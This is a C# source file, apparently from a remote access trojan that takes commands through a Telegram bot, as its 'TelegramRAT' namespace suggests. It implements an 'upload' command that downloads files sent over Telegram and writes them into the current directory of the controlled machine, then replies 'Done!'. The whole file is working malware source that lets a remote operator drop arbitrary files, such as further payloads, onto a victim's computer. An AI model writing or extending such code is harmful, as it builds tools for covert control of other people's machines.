using Telegram.Bot;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.File;

public class UploadCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IFileSystemService fileSystemService) : AbstractBotCommand
{
    public override string Command => "upload";
    public override string Description => "Upload image or file to current directory.";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            if (model.Files.Length == 0)
            {
                await botClient.SendMessage(model.Message.Chat.Id, "No file or images provided.", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                return;
            }

            foreach (var file in model.Files)
            {
                string targetPath = model.Filename ?? (file.FileUniqueId + ".jpg");
                await using var fileStream = fileSystemService.OpenFileWrite(targetPath);
                {
                    var telegramFile = await botClient.GetFile(file.FileId);
                    if (telegramFile.FilePath != null)
                    {
                        await botClient.DownloadFile(telegramFile.FilePath, fileStream);
                    }
                }
            }
            await botClient.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
